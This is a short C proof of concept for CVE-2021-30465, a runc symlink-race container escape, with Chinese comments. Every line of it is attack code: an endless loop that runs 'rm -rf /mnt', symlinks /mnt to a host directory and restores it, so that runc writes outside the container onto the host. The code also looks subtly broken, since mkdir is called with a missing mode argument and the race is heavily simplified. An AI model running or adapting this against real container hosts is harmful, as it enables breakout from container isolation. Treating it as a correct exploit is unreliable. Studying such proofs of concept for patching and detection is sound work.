// exploit.c - CVE-2021-30465 PoC
// 目标：让 runc 在宿主机 /tmp/cve_poc_target/ 下创建文件
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

int main() {
    const char *target_dir = "/host/tmp/cve_poc_target";
    const char *mount_point = "/mnt";

    // 确保目标目录存在（宿主机需提前创建，或由挂载隐式创建）
    // 实际利用中，runc 会尝试写入 /mnt/somefile，此处将其重定向到 target_dir

    while (1) {
        // 删除原挂载点（如果是目录）
        system("rm -rf /mnt");

        // 创建符号链接：/mnt -> /host/tmp/cve_poc_target
        if (symlink(target_dir, mount_point) != 0) {
            perror("symlink");
        }

        // 极短延迟，增加竞争窗口
        usleep(500);

        // 恢复为普通目录（防止 runc 报错退出太快）
        system("rm -f /mnt");
        mkdir(mount_point);
    }
    return 0;
}